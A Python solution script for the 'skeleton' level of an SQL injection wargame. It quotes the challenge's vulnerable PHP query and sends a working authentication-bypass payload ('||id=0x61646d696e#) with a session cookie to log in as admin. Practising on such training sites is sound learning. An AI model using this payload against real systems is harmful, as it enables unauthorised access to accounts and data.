#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Skeleton

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id'] == 'admin') solve("skeleton");
    """

    url = "https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'
    payload = "'||id=0x61646d696e#"

    p = los.SqlInjection(url, cook, method, inj_param, payload)
    response = p.my_request()

    if 'Clear!' in response:
        print('\nSKELETON Clear!')


if __name__ == '__main__':
    main()
